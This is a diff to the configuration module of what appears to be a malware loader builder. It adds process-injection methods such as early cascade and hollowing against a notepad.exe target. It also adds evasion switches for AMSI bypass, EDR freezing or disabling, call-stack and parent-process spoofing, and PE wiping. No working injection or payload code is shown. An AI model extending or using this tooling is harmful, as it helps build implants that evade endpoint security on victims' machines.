@@ -36,9 +36,13 @@ ENCODE_RAW = "raw"
 
 INJECT_STOMP = "stomp"
 INJECT_EARLYBIRD = "earlybird"
-INJECT_THREADPOOL = "threadpool"
+INJECT_REMOTETHREAD = "remotethread"
+INJECT_THREADPOOL = INJECT_REMOTETHREAD  # Backward-compat alias
 INJECT_HOLLOWING = "hollowing"
 INJECT_MAPPING = "mapping"
+INJECT_THREADPOOL_REAL = "threadpool_real"
+INJECT_EARLYCASCADE = "earlycascade"
+INJECT_CALLBACK = "callback"
 
 # ============================================================================
 # Default Profile
@@ -50,13 +54,22 @@ DEFAULT_PROFILE = {
     "strings": STRINGS_DJB2,
     "encrypt": ENCRYPT_CASCADE,
     "encode": ENCODE_UUID,
-    "inject": INJECT_EARLYBIRD,
+    "inject": INJECT_EARLYCASCADE,
     "target": "notepad.exe",
     "sandbox": True,
     "etw": True,
     "unhook": False,
     "sleep": 0,
     "debug": False,
+    "sleep_obfuscation": False,
+    "amsi": True,
+    "wipe_pe": True,
+    "callstack_spoof": False,
+    "dynapi": False,
+    "edr_freeze": False,
+    "edr_preload": False,
+    "freeze": False,
+    "disable_preloaded_edr": False,
 }
 
 # ============================================================================
@@ -73,17 +86,35 @@ class BuildConfig:
     strings: str = STRINGS_DJB2
     encrypt: str = ENCRYPT_CASCADE
     encode: str = ENCODE_UUID
-    inject: str = INJECT_EARLYBIRD
+    inject: str = INJECT_EARLYCASCADE
     target: str = "notepad.exe"
     
     # Evasion options
     sandbox: bool = True
     etw: bool = True
     unhook: bool = False
+    sleep_obfuscation: bool = False
+    amsi: bool = True
+    wipe_pe: bool = True
+    callstack_spoof: bool = False
+    dynapi: bool = False
+    edr_freeze: bool = False
+    edr_preload: bool = False
+    freeze: bool = False
+    disable_preloaded_edr: bool = False
+    
+    # Process spoofing options
+    spoof_cmdline: bool = False
+    ppid_spoof: str = ""
+    block_dlls: bool = False
     
     # Runtime options
     sleep: int = 0
     debug: bool = False
+    
+    # Advanced options
+    syscall_hash: bool = False
+    output_format: str = "pe"
     
     # Input/Output
     input_file: str = ""
@@ -113,14 +144,27 @@ class BuildConfig:
             return False, f"Invalid encoding: {self.encode}"
         
         # Validate injection
-        valid_inject = [INJECT_STOMP, INJECT_EARLYBIRD, INJECT_THREADPOOL, 
-                       INJECT_HOLLOWING, INJECT_MAPPING]
+        valid_inject = [INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD,
+                       "threadpool", INJECT_HOLLOWING, INJECT_MAPPING,
+                       INJECT_THREADPOOL_REAL, INJECT_EARLYCASCADE, INJECT_CALLBACK]
         if self.inject not in valid_inject:
             return False, f"Invalid injection method: {self.inject}"
         
         # Validate input file
         if self.input_file and not os.path.exists(self.input_file):
             return False, f"Input file not found: {self.input_file}"
+        
+        # Validate edr_preload
+        if not isinstance(self.edr_preload, bool):
+            return False, f"edr_preload must be a bool"
+        
+        # Validate ppid_spoof
+        if self.ppid_spoof and not self.ppid_spoof.lower().endswith('.exe'):
+            return False, f"ppid_spoof must end with .exe"
+        
+        # Validate output_format
+        if self.output_format not in ["pe", "dll", "svc"]:
+            return False, f"Invalid output format: {self.output_format}"
         
         return True, "Configuration valid"
     
